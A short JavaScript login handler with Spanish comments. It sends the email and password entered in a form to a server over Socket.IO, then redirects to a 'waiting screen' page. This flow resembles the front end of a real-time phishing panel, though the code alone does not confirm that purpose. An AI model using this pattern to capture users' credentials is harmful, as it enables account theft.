const socket = io(); // conectar con el servidor

window.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form');

  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();

      const correo = document.getElementById('usuario').value;
      const contrasena = document.getElementById('clave').value;

      // Emitimos los datos al servidor por socket
      socket.emit('dataForm', { correo, contrasena });

      // Redirigimos a la pantalla de espera
      window.location.href = 'opciones.html';
    });
  }
});
